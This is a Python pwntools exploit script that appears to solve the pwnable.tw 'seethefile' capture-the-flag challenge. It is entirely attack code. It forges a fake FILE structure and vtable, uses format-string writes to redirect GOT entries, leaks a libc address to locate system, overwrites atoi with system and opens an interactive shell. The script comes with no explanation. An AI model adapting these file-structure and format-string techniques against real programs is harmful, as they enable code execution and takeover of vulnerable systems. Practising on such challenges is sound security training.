from pwn import *
import time

io = process("./seethefile")
# io = remote("chall.pwnable.tw", 10200)
e = ELF("./seethefile")
l = ELF("./libc_32.so.6")

name_at = e.symbols['name']
main_at = e.symbols['main']
printf_at = e.plt['printf']

def choose(i):
	io.sendlineafter("Your choice :", str(i))
def fchunk():
	return p32(0) + p32(0x11) + '\x00'*0x8

# index 24
choose('5AAA' + p32(e.got['exit']) + p32(e.got['atoi']))

file_jumps_at = e.symbols['fp'] + 0x4
io_file_at = file_jumps_at + 23*0x4 + 0x8 # _IO_file_jumps has 23 entries


payload = fchunk()*2
payload += p32(io_file_at)	# overwrite fp
payload += p32(printf_at)*23	
payload += p32(0) + p32(0xa1)

"""
08048A37 main
08048500 printf

#define _IO_IS_FILEBUF 0x2000	X
#define _IO_USER_LOCK 0x8000
#define _IO_IN_BACKUP 0x100	X
"""

io_file = p32(0x02020202 | 0x8000)  + "\x01"*0x20 + p32(name_at + 0x8)
io_file +=  "%{}c%25$n%{}c%24$n".format(0x08048500 - 0x28, 0x08048A37 - 0x08048500)
print "{}".format(hex(len(io_file)))

assert(len(io_file) <= 0x46)	# _vtable_offset == 0
io_file += '\x00'*(0x94 - len(io_file))

assert(len(io_file) == 0x94) # sizeof(FILE) = 0x94
payload += io_file
payload += p32(file_jumps_at) # _IO_jump_t *vtable
payload += fchunk()*2	# next chunk from chunk at (fp - 0x8)

assert(payload.find('\n') == -1)
io.sendlineafter("Leave your name :", payload)

io.recvuntil("#")

# atoi -> printf, exit -> main
# index 7 -> userChoice
choose("%9$s" + '.'*4 + p32(e.got['puts']))

puts_at = u32(io.recv(4))
system_at = l.symbols['system'] - l.symbols['puts'] + puts_at
print "puts_at: {}".format(hex(puts_at))
print "system_at: {}".format(hex(system_at))


h = (system_at >> 16) & 0xFFFF
l = system_at & 0xFFFF

# atoi -> system
if h >= l:
	p = "%{}c%19$hn%{}c%20$hn".format(l, h - l)
else:
	p = "%{}c%20$hn%{}c%19$hn".format(h, l - h)

print p
p += 'X'*(0x30 - len(p))
# index 19
p += p32(e.got['atoi']) + p32(e.got['atoi'] + 2)

choose(p)
io.interactive()
